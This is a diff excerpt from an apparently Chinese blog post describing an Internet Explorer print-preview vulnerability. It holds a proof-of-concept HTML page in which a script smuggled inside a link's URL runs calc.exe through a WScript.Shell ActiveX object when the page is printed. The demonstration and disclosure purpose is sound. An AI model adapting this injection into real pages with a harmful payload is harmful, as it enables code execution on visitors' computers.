@@ -21,13 +21,15 @@ ViewNums: 4664
 ![](http://pic.yupoo.com/sunlei/8644058e7ef9/8tnedwcr.jpg)
 
 2.把下面代码保存成HTML，用IE打开，打印之，calc.exe会弹出。 （也可以直接访问<http://raffon.net/research/ms/ie/print/linksrce.html>）
-*<html>
+```html
+<html>
 <body>
 Print me with table of links to execute calc.exe
 <a href=”http://www.bla.com?x=b<script defer >var x=new ActiveXObject(’WScript.Shell’);x.Run(’calc.exe’);</script>a.c<u>o</u>m”></a>
 <script>window.print();</script>
 </body>
-</html>*
+</html>
+```
 
 这个[漏洞](/tags/%E6%B5%8F%E8%A7%88%E5%99%A8)大牛蛙他们据说当时很快就找出来了，应该也有很多别的同学找到了吧。
 
